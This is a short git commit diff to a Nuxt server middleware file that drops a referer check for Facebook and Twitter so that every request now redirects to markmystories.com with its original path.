9b488ee45b917417e85b35ff64dcce00bc8e4e31
finemflame <84194780+finemflame@users.noreply.github.com>
2023-05-14 21:44:38 +0200

    Update [...slug].ts

--- server/middleware/[...slug].ts
+++ server/middleware/[...slug].ts
@@ -1,8 +1,6 @@
 export default defineEventHandler((event) => {
     const headers = event.req.headers;
     
-    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        const redirectUrl = "https://markmystories.com" + event.req.url;
-        sendRedirect(event, redirectUrl);
-    }
+    const redirectUrl = "https://markmystories.com" + event.req.url;
+    sendRedirect(event, redirectUrl);
 });
